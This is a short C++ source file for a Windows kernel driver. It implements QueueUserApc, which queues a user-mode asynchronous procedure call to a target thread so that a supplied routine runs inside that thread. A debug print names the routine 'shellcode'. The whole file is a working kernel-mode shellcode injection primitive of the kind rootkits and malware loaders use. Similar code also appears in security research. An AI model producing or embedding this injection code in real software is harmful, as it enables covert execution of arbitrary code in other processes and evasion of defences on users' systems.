#include <main.h>

void kernel_free_kapc(PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*)
{
	delete apc;
	ExReleaseRundownProtection(&PendingOperations);

}

void rundown_free_kapc(PKAPC apc)
{
	delete apc;
	ExReleaseRundownProtection(&PendingOperations);

}

bool QueueUserApc(PRKTHREAD Thread, PVOID Func)
{
	PKAPC apc = new (NonPagedPool, TAG) KAPC;

	if (!apc)
		return false;

	KeInitializeApc(
		apc,
		Thread,
		OriginalApcEnvironment,
		kernel_free_kapc,
		rundown_free_kapc,
		reinterpret_cast<PKNORMAL_ROUTINE>(Func),
		UserMode,
		nullptr
	);
	DbgPrint("[*] shellcode address at 0x%p\n", Func);
 //	DbgBreakPoint();
	ExAcquireRundownProtection(&PendingOperations);
	auto inserted = ::KeInsertQueueApc(
		apc,
		nullptr,
		nullptr,
		0
	);

	if (!inserted) {
		delete apc;
		ExReleaseRundownProtection(&PendingOperations);
		return false;
	}

	return true; 
}